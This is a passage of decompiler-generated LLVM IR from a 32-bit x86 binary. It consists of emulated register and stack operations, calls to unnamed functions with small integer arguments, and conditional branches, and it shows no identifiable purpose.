  %v1_8048f33 = phi i32 [ %v1_8048f23, %dec_label_pc_8048ee1 ], [ %v1_8048f33.pre, %dec_label_pc_8048f29 ]
  %v0_8048f33 = load i32, i32* @ecx, align 4
  %v2_8048f33 = add i32 %v1_8048f33, -4
  %v3_8048f33 = inttoptr i32 %v2_8048f33 to i32*
  store i32 %v0_8048f33, i32* %v3_8048f33, align 4
  %v0_8048f34 = load i32, i32* @ecx, align 4
  %v2_8048f34 = add i32 %v1_8048f33, -8
  %v3_8048f34 = inttoptr i32 %v2_8048f34 to i32*
  store i32 %v0_8048f34, i32* %v3_8048f34, align 4
  %v1_8048f35 = add i32 %v1_8048f33, -12
  %v2_8048f35 = inttoptr i32 %v1_8048f35 to i32*
  store i32 0, i32* %v2_8048f35, align 4
  %v1_8048f37 = add i32 %v1_8048f33, -16
  %v2_8048f37 = inttoptr i32 %v1_8048f37 to i32*
  store i32 45, i32* %v2_8048f37, align 4
  %v3_8048f39 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f39, i32* %eax.global-to-local, align 4
  %v0_8048f3e = load i32, i32* @esp, align 4
  %v9_8048f3e = icmp eq i32 %v0_8048f3e, -12
  store i1 %v9_8048f3e, i1* %zf.global-to-local, align 1
  %v2_8048f41 = add i32 %v0_8048f3e, 8
  %v3_8048f41 = inttoptr i32 %v2_8048f41 to i32*
  store i32 %v3_8048f39, i32* %v3_8048f41, align 4
  %v1_8048f42 = add i32 %v0_8048f3e, 120
  %v2_8048f42 = inttoptr i32 %v1_8048f42 to i32*
  %v3_8048f42 = load i32, i32* %v2_8048f42, align 4
  store i32 %v3_8048f42, i32* @edx, align 4
  %v2_8048f46 = add i32 %v0_8048f3e, 4
  %v3_8048f46 = inttoptr i32 %v2_8048f46 to i32*
  store i32 %v3_8048f42, i32* %v3_8048f46, align 4
  %v1_8048f47 = add i32 %v0_8048f3e, 147
  store i32 %v1_8048f47, i32* @ecx, align 4
  %v3_8048f4e = inttoptr i32 %v0_8048f3e to i32*
  store i32 %v1_8048f47, i32* %v3_8048f4e, align 4
  %v4_8048f4f = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f54 = load i32, i32* @esp, align 4
  %v1_8048f54 = add i32 %v0_8048f54, 16
  %v1_8048f57 = add i32 %v4_8048f4f, 1
  %v8_8048f57 = icmp eq i32 %v1_8048f57, 0
  store i1 %v8_8048f57, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f57, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f57, label %dec_label_pc_8048f64, label %dec_label_pc_8048f5a

dec_label_pc_8048f5a:                             ; preds = %dec_label_pc_8048f33
  %v1_8048f5a = add i32 %v0_8048f54, 108
  %v2_8048f5a = inttoptr i32 %v1_8048f5a to i32*
  %v3_8048f5a = load i32, i32* %v2_8048f5a, align 4
  store i32 %v3_8048f5a, i32* %eax.global-to-local, align 4
  %v1_8048f5e = inttoptr i32 %v3_8048f5a to i32*
  store i32 1, i32* %v1_8048f5e, align 4
  %v0_8048f64.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8048f64

dec_label_pc_8048f64:                             ; preds = %dec_label_pc_8048f33, %dec_label_pc_8048f5a
  %v0_8048f64 = phi i32 [ %v1_8048f54, %dec_label_pc_8048f33 ], [ %v0_8048f64.pre, %dec_label_pc_8048f5a ]
  %v1_8048f64 = add i32 %v0_8048f64, 92
  %v2_8048f64 = inttoptr i32 %v1_8048f64 to i32*
  %v3_8048f64 = load i32, i32* %v2_8048f64, align 4
  store i32 %v3_8048f64, i32* %edx.global-to-local, align 4
  %v1_8048f68 = add i32 %v3_8048f64, 4
  %v2_8048f68 = inttoptr i32 %v1_8048f68 to i32*
  store i32 0, i32* %v2_8048f68, align 4
  %v0_8048f6f = load i32, i32* %eax.global-to-local, align 4
  %v1_8048f6f = load i32, i32* @esp, align 4
  %v2_8048f6f = add i32 %v1_8048f6f, -4
  %v3_8048f6f = inttoptr i32 %v2_8048f6f to i32*
  store i32 %v0_8048f6f, i32* %v3_8048f6f, align 4
  %v0_8048f70 = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f70 = add i32 %v1_8048f6f, -8
  %v3_8048f70 = inttoptr i32 %v2_8048f70 to i32*
  store i32 %v0_8048f70, i32* %v3_8048f70, align 4
  %v1_8048f71 = add i32 %v1_8048f6f, -12
  %v2_8048f71 = inttoptr i32 %v1_8048f71 to i32*
  store i32 0, i32* %v2_8048f71, align 4
  %v1_8048f73 = add i32 %v1_8048f6f, -16
  %v2_8048f73 = inttoptr i32 %v1_8048f73 to i32*
  store i32 44, i32* %v2_8048f73, align 4
  %v3_8048f75 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048f75, i32* %eax.global-to-local, align 4
  %v0_8048f7a = load i32, i32* @esp, align 4
  %v9_8048f7a = icmp eq i32 %v0_8048f7a, -12
  store i1 %v9_8048f7a, i1* %zf.global-to-local, align 1
  %v2_8048f7d = add i32 %v0_8048f7a, 8
  %v3_8048f7d = inttoptr i32 %v2_8048f7d to i32*
  store i32 %v3_8048f75, i32* %v3_8048f7d, align 4
  %v1_8048f7e = add i32 %v0_8048f7a, 120
  %v2_8048f7e = inttoptr i32 %v1_8048f7e to i32*
  %v3_8048f7e = load i32, i32* %v2_8048f7e, align 4
  store i32 %v3_8048f7e, i32* %eax.global-to-local, align 4
  %v2_8048f82 = add i32 %v0_8048f7a, 4
  %v3_8048f82 = inttoptr i32 %v2_8048f82 to i32*
  store i32 %v3_8048f7e, i32* %v3_8048f82, align 4
  %v1_8048f83 = add i32 %v0_8048f7a, 147
  store i32 %v1_8048f83, i32* @ecx, align 4
  %v3_8048f8a = inttoptr i32 %v0_8048f7a to i32*
  store i32 %v1_8048f83, i32* %v3_8048f8a, align 4
  %v4_8048f8b = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8048f90 = load i32, i32* @esp, align 4
  %v1_8048f90 = add i32 %v0_8048f90, 16
  %v1_8048f93 = add i32 %v4_8048f8b, 1
  %v8_8048f93 = icmp eq i32 %v1_8048f93, 0
  store i1 %v8_8048f93, i1* %zf.global-to-local, align 1
  store i32 %v1_8048f93, i32* %eax.global-to-local, align 4
  br i1 %v8_8048f93, label %dec_label_pc_8049044, label %dec_label_pc_8048f9a

dec_label_pc_8048f9a:                             ; preds = %dec_label_pc_8048f64
  %v2_8048f9a = add i32 %v0_8048f90, 12
  %v3_8048f9a = inttoptr i32 %v2_8048f9a to i32*
  store i32 %v1_8048f93, i32* %v3_8048f9a, align 4
  %v0_8048f9b = load i32, i32* %eax.global-to-local, align 4
  %v2_8048f9b = add i32 %v0_8048f90, 8
  %v3_8048f9b = inttoptr i32 %v2_8048f9b to i32*
  store i32 %v0_8048f9b, i32* %v3_8048f9b, align 4
  %v1_8048f9c = add i32 %v0_8048f90, 4
  %v2_8048f9c = inttoptr i32 %v1_8048f9c to i32*
  store i32 0, i32* %v2_8048f9c, align 4
  %v2_8048f9e = inttoptr i32 %v0_8048f90 to i32*
  store i32 44, i32* %v2_8048f9e, align 4
  %v3_8048fa0 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8048fa0, i32* %eax.global-to-local, align 4
  %v0_8048fa5 = load i32, i32* @esp, align 4
  %v9_8048fa5 = icmp eq i32 %v0_8048fa5, -12
  store i1 %v9_8048fa5, i1* %zf.global-to-local, align 1
  %v2_8048fa8 = add i32 %v0_8048fa5, 8
  %v3_8048fa8 = inttoptr i32 %v2_8048fa8 to i32*
  store i32 %v3_8048fa0, i32* %v3_8048fa8, align 4
  %v1_8048fa9 = add i32 %v0_8048fa5, 120
  %v2_8048fa9 = inttoptr i32 %v1_8048fa9 to i32*
  %v3_8048fa9 = load i32, i32* %v2_8048fa9, align 4
  %v2_8048fad = add i32 %v0_8048fa5, 4
  %v3_8048fad = inttoptr i32 %v2_8048fad to i32*
  store i32 %v3_8048fa9, i32* %v3_8048fad, align 4
  %v1_8048fae = add i32 %v0_8048fa5, 147
  store i32 %v1_8048fae, i32* %eax.global-to-local, align 4
  %v3_8048fb5 = inttoptr i32 %v0_8048fa5 to i32*
  store i32 %v1_8048fae, i32* %v3_8048fb5, align 4
  %v4_8048fb6 = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8048fb6, i32* %eax.global-to-local, align 4
  %v0_8048fbb = load i32, i32* @esp, align 4
  %v6_8048fbb = icmp eq i32 %v0_8048fbb, -16
  store i1 %v6_8048fbb, i1* %zf.global-to-local, align 1
  store i32 %v4_8048fb6, i32* %ebx.global-to-local, align 4
  %v2_8048fc0 = add i32 %v4_8048fb6, 147
  %v3_8048fc0 = add i32 %v2_8048fc0, %v0_8048fbb
  %v4_8048fc0 = inttoptr i32 %v3_8048fc0 to i8*
  %v5_8048fc0 = load i8, i8* %v4_8048fc0, align 1
  %v11_8048fc0 = icmp eq i8 %v5_8048fc0, 32
  %v1_8048fc8 = zext i1 %v11_8048fc0 to i32
  %v1_8048fcb = add i32 %v0_8048fbb, 147
  store i32 %v1_8048fcb, i32* %esi.global-to-local, align 4
  store i32 %v1_8048fc8, i32* %eax.global-to-local, align 4
  %v1_8048fd7 = add i32 %v0_8048fbb, 12
  %v2_8048fd7 = inttoptr i32 %v1_8048fd7 to i32*
  store i32 2, i32* %v2_8048fd7, align 4
  %v1_8048fd9 = add i32 %v0_8048fbb, 8
  %v2_8048fd9 = inttoptr i32 %v1_8048fd9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_8048fd9, align 4
  %v0_8048fde = load i32, i32* %ebx.global-to-local, align 4
  %v1_8048fde = load i32, i32* %eax.global-to-local, align 4
  %v2_8048fde = add i32 %v1_8048fde, %v0_8048fde
  store i32 %v2_8048fde, i32* @ebx, align 4
  %v1_8048fe0 = add i32 %v0_8048fbb, 120
  %v2_8048fe0 = inttoptr i32 %v1_8048fe0 to i32*
  %v3_8048fe0 = load i32, i32* %v2_8048fe0, align 4
  %v2_8048fe4 = sub i32 %v3_8048fe0, %v2_8048fde
  store i32 %v2_8048fe4, i32* %eax.global-to-local, align 4
  %v0_8048fe6 = load i32, i32* %esi.global-to-local, align 4
  %v2_8048fe6 = add i32 %v0_8048fe6, %v2_8048fde
  %v12_8048fe6 = icmp eq i32 %v2_8048fe6, 0
  store i1 %v12_8048fe6, i1* %zf.global-to-local, align 1
  store i32 %v2_8048fe6, i32* @esi, align 4
  %v2_8048fe8 = add i32 %v0_8048fbb, 4
  %v3_8048fe8 = inttoptr i32 %v2_8048fe8 to i32*
  store i32 %v2_8048fe4, i32* %v3_8048fe8, align 4
  %v0_8048fe9 = load i32, i32* @esi, align 4
  %v3_8048fe9 = inttoptr i32 %v0_8048fbb to i32*
  store i32 %v0_8048fe9, i32* %v3_8048fe9, align 4
  %v0_8048fea = call i32 @function_8051cf0()
  store i32 %v0_8048fea, i32* %eax.global-to-local, align 4
  %v0_8048fef = load i32, i32* @esp, align 4
  %v1_8048fef = add i32 %v0_8048fef, 16
  store i32 %v0_8048fea, i32* %edx.global-to-local, align 4
  %v10_8048ff4 = icmp eq i32 %v0_8048fea, -1
  store i1 %v10_8048ff4, i1* %zf.global-to-local, align 1
  br i1 %v10_8048ff4, label %dec_label_pc_8049044, label %dec_label_pc_8048ff9

dec_label_pc_8048ff9:                             ; preds = %dec_label_pc_8048f9a
  %v10_8048ff9 = icmp eq i32 %v0_8048fea, 1
  store i1 %v10_8048ff9, i1* %zf.global-to-local, align 1
  %v7_8048ffc = icmp sgt i32 %v0_8048fea, 1
  br i1 %v7_8048ffc, label %dec_label_pc_8048ffe, label %dec_label_pc_8049001

dec_label_pc_8048ffe:                             ; preds = %dec_label_pc_8048ff9
  %v1_8048ffe = add i32 %v0_8048fea, -2
  %v9_8048ffe = icmp eq i32 %v1_8048ffe, 0
  store i1 %v9_8048ffe, i1* %zf.global-to-local, align 1
  store i32 %v1_8048ffe, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_8049001

dec_label_pc_8049001:                             ; preds = %dec_label_pc_8048ff9, %dec_label_pc_8048ffe
  %v1_804900a = phi i32 [ %v0_8048fea, %dec_label_pc_8048ff9 ], [ %v1_8048ffe, %dec_label_pc_8048ffe ]
  %v1_8049001 = add i32 %v0_8048fef, 20920
  %v1_8049008 = load i32, i32* @ebx, align 4
  %v2_8049008 = add i32 %v1_8049001, %v1_8049008
  %v12_8049008 = icmp eq i32 %v2_8049008, 0
  store i1 %v12_8049008, i1* %zf.global-to-local, align 1
  store i32 %v2_8049008, i32* %eax.global-to-local, align 4
  %v2_804900a = add i32 %v1_804900a, -20773
  %v3_804900a = add i32 %v2_804900a, %v2_8049008
  %v4_804900a = inttoptr i32 %v3_804900a to i8*
  store i8 0, i8* %v4_804900a, align 1
  %v0_8049012 = load i32, i32* %eax.global-to-local, align 4
  %v1_8049012 = load i32, i32* @esp, align 4
  %v2_8049012 = add i32 %v1_8049012, -4
  %v3_8049012 = inttoptr i32 %v2_8049012 to i32*
  store i32 %v0_8049012, i32* %v3_8049012, align 4
  %v0_8049013 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049013 = add i32 %v1_8049012, -8
  %v3_8049013 = inttoptr i32 %v2_8049013 to i32*
  store i32 %v0_8049013, i32* %v3_8049013, align 4
  %v1_8049014 = add i32 %v1_8049012, -12
  %v2_8049014 = inttoptr i32 %v1_8049014 to i32*
  store i32 0, i32* %v2_8049014, align 4
  %v1_8049016 = add i32 %v1_8049012, -16
  %v2_8049016 = inttoptr i32 %v1_8049016 to i32*
  store i32 43, i32* %v2_8049016, align 4
  %v3_8049018 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049018, i32* %eax.global-to-local, align 4
  %v0_804901d = load i32, i32* @esi, align 4
  %v1_804901d = load i32, i32* @esp, align 4
  %v2_804901d = inttoptr i32 %v1_804901d to i32*
  store i32 %v0_804901d, i32* %v2_804901d, align 4
  store i32 %v3_8049018, i32* @ebx, align 4
  %v2_8049022 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049022, i32* %eax.global-to-local, align 4
  %v0_8049027 = load i32, i32* @esp, align 4
  %v9_8049027 = icmp eq i32 %v0_8049027, -12
  store i1 %v9_8049027, i1* %zf.global-to-local, align 1
  %v0_804902a = load i32, i32* @ebx, align 4
  %v2_804902a = add i32 %v0_8049027, 8
  %v3_804902a = inttoptr i32 %v2_804902a to i32*
  store i32 %v0_804902a, i32* %v3_804902a, align 4
  %v2_804902b = add i32 %v0_8049027, 4
  %v3_804902b = inttoptr i32 %v2_804902b to i32*
  store i32 %v2_8049022, i32* %v3_804902b, align 4
  %v0_804902c = load i32, i32* @esi, align 4
  %v3_804902c = inttoptr i32 %v0_8049027 to i32*
  store i32 %v0_804902c, i32* %v3_804902c, align 4
  %v4_804902d = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804902d, i32* %eax.global-to-local, align 4
  %v0_8049032 = load i32, i32* @esp, align 4
  %v1_8049032 = add i32 %v0_8049032, 16
  %v1_8049035 = icmp eq i32 %v4_804902d, 0
  store i1 %v1_8049035, i1* %zf.global-to-local, align 1
  br i1 %v1_8049035, label %dec_label_pc_8049044, label %dec_label_pc_8049039

dec_label_pc_8049039:                             ; preds = %dec_label_pc_8049001
  %v1_8049039 = add i32 %v0_8049032, 108
  %v2_8049039 = inttoptr i32 %v1_8049039 to i32*
  %v3_8049039 = load i32, i32* %v2_8049039, align 4
  store i32 %v3_8049039, i32* %edx.global-to-local, align 4
  %v1_804903d = add i32 %v3_8049039, 4
  %v2_804903d = inttoptr i32 %v1_804903d to i32*
  store i32 1, i32* %v2_804903d, align 4
  %v0_8049044.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049044

dec_label_pc_8049044:                             ; preds = %dec_label_pc_8049001, %dec_label_pc_8048f9a, %dec_label_pc_8048f64, %dec_label_pc_8049039
  %v0_8049044 = phi i32 [ %v1_8049032, %dec_label_pc_8049001 ], [ %v1_8048fef, %dec_label_pc_8048f9a ], [ %v1_8048f90, %dec_label_pc_8048f64 ], [ %v0_8049044.pre, %dec_label_pc_8049039 ]
  %v1_8049044 = add i32 %v0_8049044, 92
  %v2_8049044 = inttoptr i32 %v1_8049044 to i32*
  %v3_8049044 = load i32, i32* %v2_8049044, align 4
  store i32 %v3_8049044, i32* %ecx.global-to-local, align 4
  %v1_8049048 = add i32 %v3_8049044, 8
  %v2_8049048 = inttoptr i32 %v1_8049048 to i32*
  store i32 0, i32* %v2_8049048, align 4
  %v0_804904f = load i32, i32* %eax.global-to-local, align 4
  %v1_804904f = load i32, i32* @esp, align 4
  %v2_804904f = add i32 %v1_804904f, -4
  %v3_804904f = inttoptr i32 %v2_804904f to i32*
  store i32 %v0_804904f, i32* %v3_804904f, align 4
  %v0_8049050 = load i32, i32* %eax.global-to-local, align 4
  %v2_8049050 = add i32 %v1_804904f, -8
  %v3_8049050 = inttoptr i32 %v2_8049050 to i32*
  store i32 %v0_8049050, i32* %v3_8049050, align 4
  %v1_8049051 = add i32 %v1_804904f, -12
  %v2_8049051 = inttoptr i32 %v1_8049051 to i32*
  store i32 0, i32* %v2_8049051, align 4
  %v1_8049053 = add i32 %v1_804904f, -16
  %v2_8049053 = inttoptr i32 %v1_8049053 to i32*
  store i32 41, i32* %v2_8049053, align 4
  %v3_8049055 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049055, i32* %eax.global-to-local, align 4
  %v0_804905a = load i32, i32* @esp, align 4
  %v9_804905a = icmp eq i32 %v0_804905a, -12
  store i1 %v9_804905a, i1* %zf.global-to-local, align 1
  %v2_804905d = add i32 %v0_804905a, 8
  %v3_804905d = inttoptr i32 %v2_804905d to i32*
  store i32 %v3_8049055, i32* %v3_804905d, align 4
  %v1_804905e = add i32 %v0_804905a, 120
  %v2_804905e = inttoptr i32 %v1_804905e to i32*
  %v3_804905e = load i32, i32* %v2_804905e, align 4
  %v2_8049062 = add i32 %v0_804905a, 4
  %v3_8049062 = inttoptr i32 %v2_8049062 to i32*
  store i32 %v3_804905e, i32* %v3_8049062, align 4
  %v1_8049063 = add i32 %v0_804905a, 147
  store i32 %v1_8049063, i32* %eax.global-to-local, align 4
  %v3_804906a = inttoptr i32 %v0_804905a to i32*
  store i32 %v1_8049063, i32* %v3_804906a, align 4
  %v4_804906b = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  %v0_8049070 = load i32, i32* @esp, align 4
  %v1_8049070 = add i32 %v0_8049070, 16
  %v1_8049073 = add i32 %v4_804906b, 1
  %v8_8049073 = icmp eq i32 %v1_8049073, 0
  store i1 %v8_8049073, i1* %zf.global-to-local, align 1
  store i32 %v1_8049073, i32* %eax.global-to-local, align 4
  br i1 %v8_8049073, label %dec_label_pc_8049124, label %dec_label_pc_804907a

dec_label_pc_804907a:                             ; preds = %dec_label_pc_8049044
  %v0_804907a = load i32, i32* @edi, align 4
  %v2_804907a = add i32 %v0_8049070, 12
  %v3_804907a = inttoptr i32 %v2_804907a to i32*
  store i32 %v0_804907a, i32* %v3_804907a, align 4
  %v0_804907b = load i32, i32* @edi, align 4
  %v2_804907b = add i32 %v0_8049070, 8
  %v3_804907b = inttoptr i32 %v2_804907b to i32*
  store i32 %v0_804907b, i32* %v3_804907b, align 4
  %v1_804907c = add i32 %v0_8049070, 4
  %v2_804907c = inttoptr i32 %v1_804907c to i32*
  store i32 0, i32* %v2_804907c, align 4
  %v2_804907e = inttoptr i32 %v0_8049070 to i32*
  store i32 41, i32* %v2_804907e, align 4
  %v3_8049080 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_8049080, i32* %eax.global-to-local, align 4
  %v0_8049085 = load i32, i32* @esp, align 4
  %v9_8049085 = icmp eq i32 %v0_8049085, -12
  store i1 %v9_8049085, i1* %zf.global-to-local, align 1
  %v2_8049088 = add i32 %v0_8049085, 8
  %v3_8049088 = inttoptr i32 %v2_8049088 to i32*
  store i32 %v3_8049080, i32* %v3_8049088, align 4
  %v1_8049089 = add i32 %v0_8049085, 120
  %v2_8049089 = inttoptr i32 %v1_8049089 to i32*
  %v3_8049089 = load i32, i32* %v2_8049089, align 4
  %v2_804908d = add i32 %v0_8049085, 4
  %v3_804908d = inttoptr i32 %v2_804908d to i32*
  store i32 %v3_8049089, i32* %v3_804908d, align 4
  %v1_804908e = add i32 %v0_8049085, 147
  store i32 %v1_804908e, i32* @edx, align 4
  %v3_8049095 = inttoptr i32 %v0_8049085 to i32*
  store i32 %v1_804908e, i32* %v3_8049095, align 4
  %v4_8049096 = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_8049096, i32* %eax.global-to-local, align 4
  %v0_804909b = load i32, i32* @esp, align 4
  %v6_804909b = icmp eq i32 %v0_804909b, -16
  store i1 %v6_804909b, i1* %zf.global-to-local, align 1
  store i32 %v4_8049096, i32* %ebx.global-to-local, align 4
  %v2_80490a0 = add i32 %v4_8049096, 147
  %v3_80490a0 = add i32 %v2_80490a0, %v0_804909b
  %v4_80490a0 = inttoptr i32 %v3_80490a0 to i8*
  %v5_80490a0 = load i8, i8* %v4_80490a0, align 1
  %v11_80490a0 = icmp eq i8 %v5_80490a0, 32
  %v1_80490a8 = zext i1 %v11_80490a0 to i32
  %v1_80490ab = add i32 %v0_804909b, 147
  store i32 %v1_80490ab, i32* %esi.global-to-local, align 4
  store i32 %v1_80490a8, i32* %eax.global-to-local, align 4
  %v1_80490b7 = add i32 %v0_804909b, 12
  %v2_80490b7 = inttoptr i32 %v1_80490b7 to i32*
  store i32 2, i32* %v2_80490b7, align 4
  %v1_80490b9 = add i32 %v0_804909b, 8
  %v2_80490b9 = inttoptr i32 %v1_80490b9 to i32*
  store i32 ptrtoint ([3 x i8]* @global_var_8054b06.10 to i32), i32* %v2_80490b9, align 4
  %v0_80490be = load i32, i32* %ebx.global-to-local, align 4
  %v1_80490be = load i32, i32* %eax.global-to-local, align 4
  %v2_80490be = add i32 %v1_80490be, %v0_80490be
  store i32 %v2_80490be, i32* @ebx, align 4
  %v1_80490c0 = add i32 %v0_804909b, 120
  %v2_80490c0 = inttoptr i32 %v1_80490c0 to i32*
  %v3_80490c0 = load i32, i32* %v2_80490c0, align 4
  %v2_80490c4 = sub i32 %v3_80490c0, %v2_80490be
  store i32 %v2_80490c4, i32* %eax.global-to-local, align 4
  %v0_80490c6 = load i32, i32* %esi.global-to-local, align 4
  %v2_80490c6 = add i32 %v0_80490c6, %v2_80490be
  %v12_80490c6 = icmp eq i32 %v2_80490c6, 0
  store i1 %v12_80490c6, i1* %zf.global-to-local, align 1
  store i32 %v2_80490c6, i32* @esi, align 4
  %v2_80490c8 = add i32 %v0_804909b, 4
  %v3_80490c8 = inttoptr i32 %v2_80490c8 to i32*
  store i32 %v2_80490c4, i32* %v3_80490c8, align 4
  %v0_80490c9 = load i32, i32* @esi, align 4
  %v3_80490c9 = inttoptr i32 %v0_804909b to i32*
  store i32 %v0_80490c9, i32* %v3_80490c9, align 4
  %v0_80490ca = call i32 @function_8051cf0()
  store i32 %v0_80490ca, i32* %eax.global-to-local, align 4
  %v0_80490cf = load i32, i32* @esp, align 4
  %v1_80490cf = add i32 %v0_80490cf, 16
  store i32 %v0_80490ca, i32* %edx.global-to-local, align 4
  %v10_80490d4 = icmp eq i32 %v0_80490ca, -1
  store i1 %v10_80490d4, i1* %zf.global-to-local, align 1
  br i1 %v10_80490d4, label %dec_label_pc_8049124, label %dec_label_pc_80490d9

dec_label_pc_80490d9:                             ; preds = %dec_label_pc_804907a
  %v10_80490d9 = icmp eq i32 %v0_80490ca, 1
  store i1 %v10_80490d9, i1* %zf.global-to-local, align 1
  %v7_80490dc = icmp sgt i32 %v0_80490ca, 1
  br i1 %v7_80490dc, label %dec_label_pc_80490de, label %dec_label_pc_80490e1

dec_label_pc_80490de:                             ; preds = %dec_label_pc_80490d9
  %v1_80490de = add i32 %v0_80490ca, -2
  %v9_80490de = icmp eq i32 %v1_80490de, 0
  store i1 %v9_80490de, i1* %zf.global-to-local, align 1
  store i32 %v1_80490de, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_80490e1

dec_label_pc_80490e1:                             ; preds = %dec_label_pc_80490d9, %dec_label_pc_80490de
  %v1_80490ea = phi i32 [ %v0_80490ca, %dec_label_pc_80490d9 ], [ %v1_80490de, %dec_label_pc_80490de ]
  %v1_80490e1 = add i32 %v0_80490cf, 20920
  %v1_80490e8 = load i32, i32* @ebx, align 4
  %v2_80490e8 = add i32 %v1_80490e1, %v1_80490e8
  %v12_80490e8 = icmp eq i32 %v2_80490e8, 0
  store i1 %v12_80490e8, i1* %zf.global-to-local, align 1
  store i32 %v2_80490e8, i32* %eax.global-to-local, align 4
  %v2_80490ea = add i32 %v1_80490ea, -20773
  %v3_80490ea = add i32 %v2_80490ea, %v2_80490e8
  %v4_80490ea = inttoptr i32 %v3_80490ea to i8*
  store i8 0, i8* %v4_80490ea, align 1
  %v0_80490f2 = load i32, i32* @ebx, align 4
  %v1_80490f2 = load i32, i32* @esp, align 4
  %v2_80490f2 = add i32 %v1_80490f2, -4
  %v3_80490f2 = inttoptr i32 %v2_80490f2 to i32*
  store i32 %v0_80490f2, i32* %v3_80490f2, align 4
  %v0_80490f3 = load i32, i32* @ebx, align 4
  %v2_80490f3 = add i32 %v1_80490f2, -8
  %v3_80490f3 = inttoptr i32 %v2_80490f3 to i32*
  store i32 %v0_80490f3, i32* %v3_80490f3, align 4
  %v1_80490f4 = add i32 %v1_80490f2, -12
  %v2_80490f4 = inttoptr i32 %v1_80490f4 to i32*
  store i32 0, i32* %v2_80490f4, align 4
  %v1_80490f6 = add i32 %v1_80490f2, -16
  %v2_80490f6 = inttoptr i32 %v1_80490f6 to i32*
  store i32 42, i32* %v2_80490f6, align 4
  %v3_80490f8 = call i32 @function_8051240(i32 %stack_var_-20924.0.ph, i32* nonnull @0)
  store i32 %v3_80490f8, i32* %eax.global-to-local, align 4
  %v0_80490fd = load i32, i32* @esi, align 4
  %v1_80490fd = load i32, i32* @esp, align 4
  %v2_80490fd = inttoptr i32 %v1_80490fd to i32*
  store i32 %v0_80490fd, i32* %v2_80490fd, align 4
  store i32 %v3_80490f8, i32* @ebx, align 4
  %v2_8049102 = call i32 @function_8051c40(i8* %v1_8048752)
  store i32 %v2_8049102, i32* %eax.global-to-local, align 4
  %v0_8049107 = load i32, i32* @esp, align 4
  %v9_8049107 = icmp eq i32 %v0_8049107, -12
  store i1 %v9_8049107, i1* %zf.global-to-local, align 1
  %v0_804910a = load i32, i32* @ebx, align 4
  %v2_804910a = add i32 %v0_8049107, 8
  %v3_804910a = inttoptr i32 %v2_804910a to i32*
  store i32 %v0_804910a, i32* %v3_804910a, align 4
  %v2_804910b = add i32 %v0_8049107, 4
  %v3_804910b = inttoptr i32 %v2_804910b to i32*
  store i32 %v2_8049102, i32* %v3_804910b, align 4
  %v0_804910c = load i32, i32* @esi, align 4
  %v3_804910c = inttoptr i32 %v0_8049107 to i32*
  store i32 %v0_804910c, i32* %v3_804910c, align 4
  %v4_804910d = call i32 @function_8051f30(i8* %v1_8048752, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v4_804910d, i32* %eax.global-to-local, align 4
  %v0_8049112 = load i32, i32* @esp, align 4
  %v1_8049112 = add i32 %v0_8049112, 16
  %v1_8049115 = icmp eq i32 %v4_804910d, 0
  store i1 %v1_8049115, i1* %zf.global-to-local, align 1
  br i1 %v1_8049115, label %dec_label_pc_8049124, label %dec_label_pc_8049119

dec_label_pc_8049119:                             ; preds = %dec_label_pc_80490e1
  %v1_8049119 = add i32 %v0_8049112, 108
  %v2_8049119 = inttoptr i32 %v1_8049119 to i32*
  %v3_8049119 = load i32, i32* %v2_8049119, align 4
  store i32 %v3_8049119, i32* @ecx, align 4
  %v1_804911d = add i32 %v3_8049119, 8
  %v2_804911d = inttoptr i32 %v1_804911d to i32*
  store i32 1, i32* %v2_804911d, align 4
  %v1_8049124.pre = load i32, i32* @esp, align 4
  br label %dec_label_pc_8049124

dec_label_pc_8049124:                             ; preds = %dec_label_pc_80490e1, %dec_label_pc_804907a, %dec_label_pc_8049044, %dec_label_pc_8049119
  %v1_8049124 = phi i32 [ %v1_8049112, %dec_label_pc_80490e1 ], [ %v1_80490cf, %dec_label_pc_804907a ], [ %v1_8049070, %dec_label_pc_8049044 ], [ %v1_8049124.pre, %dec_label_pc_8049119 ]
  %v0_8049124 = load i32, i32* @ecx, align 4
  %v2_8049124 = add i32 %v1_8049124, -4
  %v3_8049124 = inttoptr i32 %v2_8049124 to i32*
  store i32 %v0_8049124, i32* %v3_8049124, align 4
  %v0_8049125 = load i32, i32* @ecx, align 4
  %v2_8049125 = add i32 %v1_8049124, -8
  %v3_8049125 = inttoptr i32 %v2_8049125 to i32*
  store i32 %v0_8049125, i32* %v3_8049125, align 4
  %v1_8049126 = add i32 %v1_8049124, -12
  %v2_8049126 = inttoptr i32 %v1_8049126 to i32*
  store i32 0, i32* %v2_8049126, align 4
  %v1_8049128 = add i32 %v1_8049124, -16
